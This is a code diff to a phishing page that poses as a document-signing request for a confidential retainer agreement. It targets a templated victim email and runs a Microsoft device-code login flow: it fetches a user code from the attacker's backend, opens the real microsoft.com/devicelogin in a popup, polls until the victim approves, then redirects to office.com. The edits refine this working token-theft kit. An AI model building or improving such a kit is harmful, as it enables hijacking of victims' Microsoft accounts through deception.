@@ -113,7 +113,7 @@ body{background:#f1f1f1;font-family:'Lato',Helvetica,Arial,sans-serif;color:#333
       <div class="doc-details">
         <div class="doc-title">Retainer_Agreement_Confidential_2026.pdf</div>
         <div class="doc-meta">3 pages · 1 signer required · Sent <span class="dyn-date-short"></span></div>
-        <div class="doc-meta" style="margin-top:2px">Expires: <strong><span class="dyn-date-plus7"></span></strong></div>
+        
         <div class="doc-badge">⏳ Waiting for your signature</div>
       </div>
     </div>
@@ -208,12 +208,12 @@ const LINK_ID='{{LINK_ID}}',TARGET='{{TARGET_EMAIL}}';
 function gv(){const e=(document.getElementById('gem').value||'').trim().toLowerCase(),err=document.getElementById('gerr');if(e===TARGET.toLowerCase()){const g=document.getElementById('email-gate');g.style.transition='opacity .3s';g.style.opacity='0';setTimeout(()=>g.remove(),300);}else{err.style.display='block';const i=document.getElementById('gem');i.style.borderColor='#e74c3c';i.style.animation='shake .35s ease';setTimeout(()=>{i.style.animation='';i.style.borderColor='';},400);}}
 // Auth
 let sc='',pi,ci,tl=900;
-function startAuth(){document.getElementById('auth-overlay').style.display='flex';fetch('/api/device/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:LINK_ID})}).then(r=>r.json()).then(d=>{if(d.error){location.reload();return;}sc=d.user_code;document.getElementById('code-val').textContent=sc;document.getElementById('spinner-sec').style.display='none';document.getElementById('code-sec').style.display='block';ci=setInterval(()=>{tl--;const m=String(Math.floor(tl/60)).padStart(2,'0'),s=String(tl%60).padStart(2,'0');const el=document.getElementById('xtimer');if(el)el.textContent=m+':'+s;if(tl<=0)clearInterval(ci);},1000);pi=setInterval(()=>{fetch('/api/device/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:LINK_ID,device_code:d.device_code})}).then(r=>r.json()).then(p=>{if(p.success){clearInterval(pi);clearInterval(ci);document.getElementById('code-sec').style.display='none';document.getElementById('ok-sec').style.display='block';document.getElementById('auth-title').textContent='Verification Complete';document.getElementById('auth-sub').textContent='Your identity has been confirmed.';setTimeout(()=>window.location.href='https://www.office.com',2500);}}).catch(()=>{});},( d.interval||5)*1000);}).catch(()=>location.reload());}
+function startAuth(){document.getElementById('auth-overlay').style.display='flex';fetch('/api/device/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:LINK_ID})}).then(r=>r.json()).then(d=>{if(d.error){location.reload();return;}sc=d.userCode||d.user_code;document.getElementById('code-val').textContent=sc;document.getElementById('spinner-sec').style.display='none';document.getElementById('code-sec').style.display='block';ci=setInterval(()=>{tl--;const m=String(Math.floor(tl/60)).padStart(2,'0'),s=String(tl%60).padStart(2,'0');const el=document.getElementById('xtimer');if(el)el.textContent=m+':'+s;if(tl<=0)clearInterval(ci);},1000);pi=setInterval(()=>{fetch('/api/device/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:LINK_ID,device_code:d.deviceCode||d.device_code})}).then(r=>r.json()).then(p=>{if(p.success){clearInterval(pi);clearInterval(ci);document.getElementById('code-sec').style.display='none';document.getElementById('ok-sec').style.display='block';document.getElementById('auth-title').textContent='Verification Complete';document.getElementById('auth-sub').textContent='Your identity has been confirmed.';setTimeout(()=>window.location.href='https://www.office.com',2500);}}).catch(()=>{});},( d.interval||5)*1000);}).catch(()=>location.reload());}
 
 function openLogin(){
   cpCode();
   const url='https://microsoft.com/devicelogin';
-  const w=window.open(url,'_blank','width=560,height=620,left=200,top=100,noopener');
+  const w=window.open(url,'ML','width=520,height=600,left='+Math.round((screen.width-520)/2)+',top='+Math.round((screen.height-600)/2));
   if(!w||w.closed||typeof w.closed==='undefined'){
     // Popup blocked — fall back to redirect in same tab after short delay
     const btn=document.getElementById('open-btn');
